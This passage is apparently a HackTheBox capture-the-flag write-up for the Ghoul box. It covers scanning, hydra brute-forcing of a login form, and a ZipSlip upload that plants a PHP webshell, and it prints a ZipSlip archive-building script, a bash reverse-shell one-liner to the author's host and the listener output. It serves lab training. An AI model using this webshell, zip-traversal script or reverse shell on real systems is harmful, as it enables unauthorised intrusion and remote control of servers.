@@ -1,0 +1,1078 @@
+<article class="post h-entry" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header class="post-header">
+<h1 class="post-title p-name" itemprop="name headline">HTB: Ghoul</h1>
+<p class="post-meta">
+<span class="tag-list"><a class="post-tag" href="/tags#hackthebox">hackthebox</a> <a class="post-tag" href="/tags#htb-ghoul">htb-ghoul</a> <a class="post-tag" href="/tags#ctf">ctf</a> <a class="post-tag" href="/tags#nmap">nmap</a> <a class="post-tag" href="/tags#gobuster">gobuster</a> <a class="post-tag" href="/tags#hydra">hydra</a> <a class="post-tag" href="/tags#zipslip">zipslip</a> <a class="post-tag" href="/tags#tomcat">tomcat</a> <a class="post-tag" href="/tags#docker">docker</a> <a class="post-tag" href="/tags#ssh">ssh</a> <a class="post-tag" href="/tags#pivot">pivot</a> <a class="post-tag" href="/tags#cewl">cewl</a> <a class="post-tag" href="/tags#john">john</a> <a class="post-tag" href="/tags#gogs">gogs</a> <a class="post-tag" href="/tags#tunnel">tunnel</a> <a class="post-tag" href="/tags#gogsownz">gogsownz</a> <a class="post-tag" href="/tags#credentials">credentials</a> <a class="post-tag" href="/tags#suid">suid</a> <a class="post-tag" href="/tags#git">git</a> <a class="post-tag" href="/tags#ssh-agent-hijack">ssh-agent-hijack</a> <a class="post-tag" href="/tags#cron">cron</a> <a class="post-tag" href="/tags#htb-reddish">htb-reddish</a> </span><br/><br/>
+<time class="dt-published" datetime="2019-10-05T13:45:00+00:00" itemprop="datePublished">Oct 5, 2019
+      </time></p>
+</header>
+<div class="post-content e-content" itemprop="articleBody">
+<div class="row">
+<div class="col-sm-3">
+<div class="sticky-top">
+<p><a href="/2019/10/05/htb-ghoul.html" style="color: #e6e6e6; text-decoration: none;">HTB: Ghoul</a></p>
+<!--https://afeld.github.io/bootstrap-toc/-->
+<nav data-toggle="toc" id="toc"></nav>
+</div>
+</div>
+<div class="col-sm-9" id="postBody">
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/ghoul-cover.webp" type="image/webp"/>
+<img alt="Ghoul" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/ghoul-cover.png" style="float: right;margin-right:50px; margin-left:50px; width:120px; height:120px;">
+</img></picture>
+<p>Ghoul was a long box, that involved pioviting between multiple docker containers exploiting things and collecting information to move to the next step. With a level of pivoting not seen in HackTheBox since <a href="/2019/01/26/htb-reddish.html">Reddish</a>, I’ll need to pay careful attention to various passwords and other bits of information as I move through the containers. I’ll exploit a webapp using the ZipSlip vulnerability to get a webshell up and get a shell as www-data, only to find that the exploited webserver is running as root, and with another ZipSlip, I can escalate to root. Still with no flags, I’ll crack an ssh key and pivot to the second container. From there, I can access a third container hosting the self hosted git solution, gogs. With some password reuse and the gogsownz exploit, I’ll get a shell on that container, and use a suid binary to get root. That provides access to a git repo that has a password I can use for root on the second container. As root, I can see ssh sessions connecting through this container and to the main host using ssh agent forwarding, and I’ll hijack that to get root on the final host. In beyond root, I’ll explore the ssh situation on the final host and get myself persistence, look at the crons running to simulate the user using ssh agent forwarding, and show a network map of the entire system.</p>
+<h2 id="box-info">Box Info</h2>
+<!-- https://app.hackthebox.com/machines/187 -->
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th style="text-align: right"><a href="https://hackthebox.com/machines/ghoul" style="font-size: xx-large; text-shadow: 0 0 5px #ffffff, 0 0 7px #ffffff; color: #1756a9" target="_blank">Ghoul</a> <a href="https://hackthebox.com/machines/ghoul" target="_blank"><picture style="float: right; padding-left: 20px;"><source srcset="/icons/box-ghoul.webp" type="image/webp"/> <img alt="Ghoul" class="img-av" src="/icons/box-ghoul.png"/></picture></a><br/><a href="https://hackthebox.com/machines/ghoul" style="font-size: small; color: white;" target="_blank">Play on HackTheBox</a></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Release Date</td>
+<td style="text-align: right"><a href="https://twitter.com/hackthebox_eu/status/1123890625508720640">04 May 2019</a></td>
+</tr>
+<tr>
+<td>Retire Date</td>
+<td style="text-align: right">05 Oct 2019</td>
+</tr>
+<tr>
+<td>OS</td>
+<td style="text-align: right">Linux <picture><source srcset="/icons/Linux.webp" type="image/webp"/><img alt="Linux" class="img-os" src="/icons/Linux.png"/></picture></td>
+</tr>
+<tr>
+<td>Base Points</td>
+<td style="text-align: right"><span class="diff-Hard">Hard [40]</span></td>
+</tr>
+<tr>
+<td>Rated Difficulty</td>
+<td style="text-align: right"><picture><source srcset="/img/ghoul-diff.webp" type="image/webp"/><img alt="Rated difficulty for Ghoul" src="/img/ghoul-diff.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td>Radar Graph</td>
+<td style="text-align: right"><picture><source srcset="/img/ghoul-radar.webp" type="image/webp"/><img alt="Radar chart for Ghoul" src="/img/ghoul-radar.png" style="display: unset;"/></picture></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-user.webp" type="image/webp"/><img alt="First Blood User" src="/icons/first-blood-user.png" style="display: unset"/></picture></td>
+<td style="text-align: right"><span class="blood-time">01:32:20</span><a href="https://app.hackthebox.com/users/52045" rel="noopener" target="_blank"><img alt="InfoSecJack" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/52045" style="display: unset"/><span class="user-text" style="display: none"> InfoSecJack</span></a><br/></td>
+</tr>
+<tr>
+<td><picture><source srcset="/icons/first-blood-root.webp" type="image/webp"/><img alt="First Blood Root" src="/icons/first-blood-root.png" style="display: unset"/></picture></td>
+<td style="text-align: right">1 day<span class="blood-time">20:36:51</span><a href="https://app.hackthebox.com/users/3704" rel="noopener" target="_blank"><img alt="st3r30byt3" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/3704" style="display: unset"/><span class="user-text" style="display: none"> st3r30byt3</span></a><br/></td>
+</tr>
+<tr>
+<td>Creators</td>
+<td style="text-align: right"><a href="https://app.hackthebox.com/users/8308" rel="noopener" target="_blank"><img alt="MinatoTW" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/8308" style="display: unset"/><span class="user-text" style="display: none"> MinatoTW</span></a><br/> <a href="https://app.hackthebox.com/users/1190" rel="noopener" target="_blank"><img alt="egre55" onerror="this.style.display='none'; this.nextSibling.style.display='inline';" src="https://www.hackthebox.com/badge/image/1190" style="display: unset"/><span class="user-text" style="display: none"> egre55</span></a><br/></td>
+</tr>
+</tbody>
+</table>
+<h2 id="recon">Recon</h2>
+<h3 id="network-map">Network Map</h3>
+<p>Because this box has so many different users and containers, I’ve created a <a href="https://0xdfimages.gitlab.io/img/ghoul-networkmap.png">network map</a>, which I include in <a href="#map-of-ghoul">Beyond Root</a>, but I’ll also link here in case you want it to follow along.</p>
+<h3 id="nmap">nmap</h3>
+<p><code class="language-plaintext highlighter-rouge">nmap</code> shows two ssh (22, 2222) and two http (80, 8080):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nmap <span class="nt">-sT</span> <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 <span class="nt">-oA</span> scans/nmap-alltcp 10.10.10.101
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-18 09:25 EDT
+Warning: 10.10.10.101 giving up on port because retransmission cap hit (10).
+Nmap scan report for 10.10.10.101
+Host is up (0.090s latency).
+Not shown: 39690 closed ports, 25841 filtered ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 45.75 seconds
+
+</span><span class="gp">root@kali# </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80,2222,8080 <span class="nt">-oA</span> scans/nmap-scripts 10.10.10.101
+<span class="go">Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-18 09:28 EDT
+Nmap scan report for 10.10.10.101
+Host is up (0.100s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 c1:1c:4b:0c:c6:de:ae:99:49:15:9e:f9:bc:80:d2:3f (RSA)
+|_  256 a8:21:59:7d:4c:e7:97:ad:78:51:da:e5:f0:f9:ab:7d (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Aogiri Tree
+2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 63:59:8b:4f:8d:0a:e1:15:44:14:57:27:e7:af:fb:3b (RSA)
+|   256 8c:8b:a0:a8:85:10:3d:27:07:51:29:ad:9b:ec:57:e3 (ECDSA)
+|_  256 9a:f5:31:4b:80:11:89:26:59:61:95:ff:5c:68:bc:a7 (ED25519)
+8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Aogiri
+|_http-server-header: Apache-Coyote/1.1
+|_http-title: Apache Tomcat/7.0.88 - Error report
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 10.69 seconds
+</span></code></pre></div></div>
+<p>Two ssh ports suggests already that I’ll likely be dealing with containers. Based on the <a href="https://packages.ubuntu.com/search?keywords=openssh-server">ssh versions</a> and the <a href="https://packages.ubuntu.com/search?keywords=apache2">apache version</a>, every host I can see so far seems like Ubuntu Bionic (18.04).</p>
+<h3 id="website---tcp-80">Website - TCP 80</h3>
+<h4 id="site">Site</h4>
+<p>A page for Aogiri Tree, Ghoul Society:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558187646063.webp" type="image/webp"/>
+<img alt="1558187646063" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558187646063.png"/>
+</picture>
+<p>There are a few pages available via links. I can gather a few usernames just by reading the page and <code class="language-plaintext highlighter-rouge">/blog.html</code>. I’ll start a list.</p>
+<h4 id="directory-brute-force">Directory Brute Force</h4>
+<p><code class="language-plaintext highlighter-rouge">gobuster</code> revals a few interesting paths:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.101/
+[+] Threads      : 50
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : php,html
+[+] Timeout      : 10s
+=====================================================
+2019/05/18 09:32:36 Starting gobuster
+=====================================================
+/archives (Status: 301)
+/blog.html (Status: 200)
+/uploads (Status: 301)
+/images (Status: 301)
+/contact.html (Status: 200)
+/users (Status: 301)
+/index.html (Status: 200)
+/css (Status: 301)
+/js (Status: 301)
+/secret.php (Status: 200)
+/less (Status: 301)
+=====================================================
+2019/05/18 09:41:27 Finished
+=====================================================
+</span></code></pre></div></div>
+<h4 id="uploads-and-less">/uploads and /less</h4>
+<p>Both of these return 403 Forbidden, and <code class="language-plaintext highlighter-rouge">gobuster</code> doesn’t find anything:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>gobuster <span class="nt">-u</span> http://10.10.10.101/uploads/ <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-x</span> php,html <span class="nt">-t</span> 50 <span class="nt">-o</span> scans/gobuster-80-uploads-small-php_html           
+<span class="go">
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.101/uploads/
+[+] Threads      : 50
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : php,html
+[+] Timeout      : 10s
+=====================================================
+2019/05/18 09:39:39 Starting gobuster
+=====================================================
+=====================================================
+2019/05/18 09:49:00 Finished
+=====================================================
+</span><span class="gp">root@kali# </span>gobuster <span class="nt">-u</span> http://10.10.10.101/less <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt <span class="nt">-x</span> php,html <span class="nt">-t</span> 50 <span class="nt">-o</span> scans/gobuster-80-less-small-php_html                  
+<span class="go">
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.101/less/
+[+] Threads      : 50
+[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : php,html
+[+] Timeout      : 10s
+=====================================================
+2019/05/18 09:42:39 Starting gobuster
+=====================================================
+=====================================================
+2019/05/18 09:51:52 Finished
+=====================================================
+</span></code></pre></div></div>
+<p>I’ll move on from these.</p>
+<h4 id="secretphp">secret.php</h4>
+<p><code class="language-plaintext highlighter-rouge">secret.php</code> has a chat page that is “unavailable at the moment”, which means I can’t submit new chat. But there’s interesting previous chat:</p>
+<p><a href="https://0xdfimages.gitlab.io/img/1558187753599.png"><img alt="Secret Chat" src="https://0xdfimages.gitlab.io/img/1558187753599.png"/><em>Click for full size image</em></a></p>
+<p>I’ll collect some more usernames. Along with a troll for <code class="language-plaintext highlighter-rouge">user.txt</code>, there are some hints:</p>
+<ul>
+<li>There’s RCE somewhere in the website.</li>
+<li>Kaneki has a remote server.</li>
+<li>There’s a “fake art site” for uploading pictures. Uploading is always a good thing to find and check out.</li>
+</ul>
+<h4 id="users">/users</h4>
+<p>The page presents a login:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558209630986.webp" type="image/webp"/>
+<img alt="1558209630986" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558209630986.png"/>
+</picture>
+<p>I’ve collected a list of names from the port 80 website:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tatara  &lt;-- secret.php
+noro    &lt;-- secret.php
+kaneki  &lt;-- secret.php
+eto     &lt;-- secret.php
+aogiri  &lt;-- /
+anteiku &lt;-- blog
+mado    &lt;-- blog
+amon    &lt;-- blog
+root    &lt;-- guess
+admin   &lt;-- author of blog posts
+administrator &lt;-- guess
+</code></pre></div></div>
+<p>And I can brute force it and get some successful logins. On a failed login attempt, it adds a message:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558209959168.webp" type="image/webp"/>
+<img alt="1558209959168" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558209959168.png"/>
+</picture>
+<p>I’ll use that as my failure criteria, and run <code class="language-plaintext highlighter-rouge">hydra</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>hydra <span class="nt">-L</span> <span class="nb">users</span> <span class="nt">-P</span> /usr/share/seclists/Passwords/twitter-banned.txt 10.10.10.101 http-post-form <span class="s2">"/users/login.php:Username=^USER^&amp;Password=^PASS^&amp;Submit=Login:Invalid Login Detai
+</span><span class="go">ls"
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-05-18 16:11:19
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 4367 login tries (l:11/p:397), ~273 tries per task
+[DATA] attacking http-post-form://10.10.10.101:80/users/login.php:Username=^USER^&amp;Password=^PASS^&amp;Submit=Login:Invalid Login Details                                                                                       
+[80][http-post-form] host: 10.10.10.101   login: noro   password: password123
+[80][http-post-form] host: 10.10.10.101   login: kaneki   password: 123456
+[STATUS] 1360.00 tries/min, 1360 tries in 00:01h, 3007 to do in 00:03h, 16 active
+[STATUS] 1120.00 tries/min, 2240 tries in 00:02h, 2127 to do in 00:02h, 16 active
+[STATUS] 1038.33 tries/min, 3115 tries in 00:03h, 1252 to do in 00:02h, 16 active
+[80][http-post-form] host: 10.10.10.101   login: admin   password: abcdef
+[STATUS] 1086.50 tries/min, 4346 tries in 00:04h, 21 to do in 00:01h, 16 active
+1 of 1 target successfully completed, 3 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-05-18 16:15:21
+</span></code></pre></div></div>
+<p>I find three valid logins, but unfortunately, it is just is a troll:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558210387826.webp" type="image/webp"/>
+<img alt="1558210387826" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558210387826.png"/>
+</picture>
+<h3 id="website---tcp-8080">Website - TCP 8080</h3>
+<p>Visiting prompts for auth:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558187824401.webp" type="image/webp"/>
+<img alt="1558187824401" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558187824401.png"/>
+</picture>
+<p>I was about to fire up <code class="language-plaintext highlighter-rouge">hydra</code> again, but I guessed “admin” / “admin” and it lets me in, presenting another page about image uploads:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558210471996.webp" type="image/webp"/>
+<img alt="1558210471996" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558210471996.png"/>
+</picture>
+<p>This must be the “fake art site” mentioned in <code class="language-plaintext highlighter-rouge">secret.php</code>.</p>
+<p>At the very top, there’s a upload image panel. Additionally, if I click the blue arrows on the right and left, there are two other panels:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558210540314.webp" type="image/webp"/>
+<img alt="1558210540314" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558210540314.png"/>
+</picture>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/1558210553204.webp" type="image/webp"/>
+<img alt="1558210553204" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/1558210553204.png"/>
+</picture>
+<p>With a little testing, I’ll see that I’m only allowed to upload jpegs on the original form, and zips on the third one. There may be some extension bypasses, but I won’t need them.</p>
+<h2 id="shell-as-www-data-on-aogiri">Shell as www-data on Aogiri</h2>
+<h3 id="zipslip-background">ZipSlip Background</h3>
+<p>When I googled “malicious zip file upload”, the first link was <a href="https://nakedsecurity.sophos.com/2018/06/06/the-zip-slip-vulnerability-what-you-need-to-know/">this article from naked security</a>. Research from summer 2018 revealed that a lot of zip programs weren’t doing path traversal checks on zip files when they unzipped them. For any user interface that takes untrusted zip files, that could be a big issue, as it would allow arbitrary write anywhere the web process can write.</p>
+<p>This happens because zip files store files with relative paths, relative to the directory they are unzipped into. The vulnerability is that I can put a file into my zip with path <code class="language-plaintext highlighter-rouge">../../../../../../../../../../etc/passwd</code>, and it will unzip and try to overwrite the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file on the host (though usually will fail assuming www-data can’t write to <code class="language-plaintext highlighter-rouge">/etc/passwd</code>). But there is a lot of damage that can be done, often writing a webshell.</p>
+<h3 id="webshell">WebShell</h3>
+<p>I’ve already seen the site is running php. I’ll grab my trusty simple php webshell, and copy it to the <code class="language-plaintext highlighter-rouge">/var/www/html</code> directory on my kali host.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span><span class="nb">cp</span> /opt/shells/php/cmd.php /var/www/html/
+<span class="gp">root@kali# </span><span class="nb">cat</span> /var/www/html/cmd.php 
+<span class="go">&lt;?php system($_REQUEST['cmd']); ?&gt;
+</span></code></pre></div></div>
+<p>Now I’ll add it to a zip file, but with a lot of <code class="language-plaintext highlighter-rouge">../</code> to ensure that I get to the system root. Remember, Linux will ignore attempts to change to a parent directory from <code class="language-plaintext highlighter-rouge">/</code>, so <code class="language-plaintext highlighter-rouge">/../../../</code> is the same as <code class="language-plaintext highlighter-rouge">/</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>zip mal.zip ../../../../../../var/www/html/cmd.php
+<span class="go">  adding: ../../../../../../var/www/html/cmd.php (stored 0%)
+</span></code></pre></div></div>
+<p>I can check and make sure it stored correctly using <code class="language-plaintext highlighter-rouge">unzip -l</code> to list the contents:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>unzip <span class="nt">-l</span> ~/hackthebox/ghoul-10.10.10.101/mal.zip
+<span class="go">Archive:  /root/hackthebox/ghoul-10.10.10.101/mal.zip
+  Length      Date    Time    Name
+---------  ---------- -----   ----
+       35  2019-05-18 15:58   ../../../../../../var/www/html/cmd.php
+---------                     -------
+       35                     1 file
+
+</span></code></pre></div></div>
+<p>Now I’ll upload it to the site, and check, and my page is there on the port 80 site:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://10.10.10.101/cmd.php?cmd<span class="o">=</span><span class="nb">id</span>
+<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h3 id="script">Script</h3>
+<p>I wrote a script to perform ZipSlip for me:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+
+<span class="k">function </span>usage <span class="o">{</span>
+    <span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> [out_zip] [file] [desired path] &lt;number of ../&gt;"</span>
+    <span class="nb">echo</span> <span class="s2">"  Number of ../ will be 8 if not given"</span>
+    <span class="nb">echo</span> <span class="s2">"  desired path must be absolute"</span>
+    <span class="nb">echo</span> <span class="s2">"  Ex: </span><span class="nv">$0</span><span class="s2"> evil.zip evil_passwd /etc/passwd 5"</span>
+    <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n</span><span class="nv">$message</span><span class="s2">"</span>
+    <span class="nb">exit </span>1
+<span class="o">}</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-lt</span> 3 <span class="nt">-o</span> <span class="s2">"$#"</span> <span class="nt">-gt</span> 4 <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span>usage
+<span class="k">fi</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-r</span> <span class="nv">$2</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nv">message</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2"> does not exist. Please check path to file."</span>
+    usage
+<span class="k">fi</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="o">[[</span> <span class="o">!</span> <span class="nv">$3</span> <span class="o">==</span> /<span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nv">message</span><span class="o">=</span><span class="s2">"[desired path] must be absolute, starting with /"</span>
+    usage
+<span class="k">fi</span><span class="p">;</span>
+
+<span class="c"># Set variables</span>
+<span class="nv">outfile</span><span class="o">=</span><span class="si">$(</span><span class="nb">realpath</span> <span class="nv">$1</span><span class="si">)</span>
+<span class="nv">file</span><span class="o">=</span><span class="nv">$2</span>
+<span class="nv">path</span><span class="o">=</span><span class="nv">$3</span>
+
+<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-eq</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then
+    </span><span class="nv">num_ups</span><span class="o">=</span>8<span class="p">;</span>
+<span class="k">else
+    </span><span class="nv">num_ups</span><span class="o">=</span><span class="nv">$4</span>
+<span class="k">fi</span><span class="p">;</span>
+<span class="nv">num_dirs</span><span class="o">=</span><span class="k">$((</span><span class="nv">$num_ups</span> <span class="o">-</span> <span class="si">$(</span><span class="nb">echo</span> <span class="nv">$path</span> | <span class="nb">tr</span> <span class="nt">-cd</span> <span class="s1">'/'</span> | <span class="nb">wc</span> <span class="nt">-c</span><span class="si">)</span> <span class="o">+</span> <span class="m">1</span><span class="k">))</span>
+
+
+<span class="nv">base</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nv">target_dir</span><span class="o">=</span><span class="si">$(</span><span class="nb">dirname</span> <span class="nv">$path</span><span class="si">)</span>
+<span class="nv">current_dir</span><span class="o">=</span><span class="k">${</span><span class="nv">base</span><span class="k">}${</span><span class="nv">target_dir</span><span class="k">}</span><span class="si">$(</span><span class="nb">yes</span> <span class="s2">"/a"</span> | <span class="nb">head</span> -<span class="k">${</span><span class="nv">num_dirs</span><span class="k">}</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="si">)</span>
+
+<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="k">${</span><span class="nv">current_dir</span><span class="k">}</span>
+<span class="nb">cp</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span> <span class="k">${</span><span class="nv">base</span><span class="k">}${</span><span class="nv">path</span><span class="k">}</span> 
+<span class="nb">cd</span> <span class="k">${</span><span class="nv">current_dir</span><span class="k">}</span>
+
+<span class="nv">trav</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">yes</span> <span class="s1">'/..'</span> | <span class="nb">head</span> -<span class="k">${</span><span class="nv">num_ups</span><span class="k">}</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span> | <span class="nb">cut</span> <span class="nt">-c2-</span> | rev<span class="si">)</span><span class="s2">"</span>
+
+zip <span class="nv">$outfile</span> <span class="s2">"</span><span class="k">${</span><span class="nv">trav</span><span class="k">}${</span><span class="nv">path</span><span class="k">}</span><span class="s2">"</span> <span class="o">&gt;</span>/dev/null
+unzip <span class="nt">-l</span> <span class="nv">$outfile</span>
+<span class="nb">rm</span> <span class="nt">-rf</span> <span class="k">${</span><span class="nv">base</span><span class="k">}</span> 
+</code></pre></div></div>
+<p>Here’s how it runs:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./zip_slip.sh 
+<span class="go">Usage: ./zip_slip.sh [out_zip] [file] [desired path] &lt;number of ../&gt;
+  Number of ../ will be 8 if not given
+  desired path must be absolute
+  Ex: ./zip_slip.sh evil.zip evil_passwd /etc/passwd 5
+</span></code></pre></div></div>
+<p>Since I wrote that while solving, I also found this <code class="language-plaintext highlighter-rouge">python</code> version, <a href="https://github.com/ptoomey3/evilarc/blob/master/evilarc.py">evilarc.py</a>.</p>
+<h3 id="shell">Shell</h3>
+<p>Running a basic bash rev shell in the webshell gets me a callback:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>curl http://10.10.10.101/cmd.php <span class="nt">--data-urlencode</span> <span class="s2">"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.7/443 0&gt;&amp;1'"</span>
+</code></pre></div></div>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>nc <span class="nt">-lnvp</span> 443
+<span class="go">Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.101.
+Ncat: Connection from 10.10.10.101:52930.
+bash: cannot set terminal process group (10): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">www-data@Aogiri:/var/www/html$</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></code></pre></div></div>
+<h2 id="privesc-root-on-aogiri">Privesc: root on Aogiri</h2>
+<h3 id="enumeration">Enumeration</h3>
+<p>Enumeration leads to a couple of interesting observations. I’m in a docker container. There’s a <code class="language-plaintext highlighter-rouge">.dockerenv</code> file in the system root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Aogiri:/$ </span><span class="nb">ls</span> <span class="nt">-a</span> /
+<span class="go">.   .dockerenv  boot  etc   lib    media  opt   root  sbin  sys  usr
+..  bin         dev   home  lib64  mnt    proc  run   srv   tmp  var
+</span></code></pre></div></div>
+<p>Also, I can see it in <a href="https://en.wikipedia.org/wiki/Cgroups">Cgroups</a>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">www-data@Aogiri:/$ </span><span class="nb">grep</span> <span class="nt">-i</span> docker /proc/self/cgroup
+<span class="go">12:blkio:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+11:cpuset:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+10:pids:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+9:freezer:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+8:net_cls,net_prio:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+7:devices:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+5:memory:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
+4:perf_event:/docker/b40e2207e3f430e346b59d3b45d6b90707c9a12e4171958f3b3b5e97eff6e604
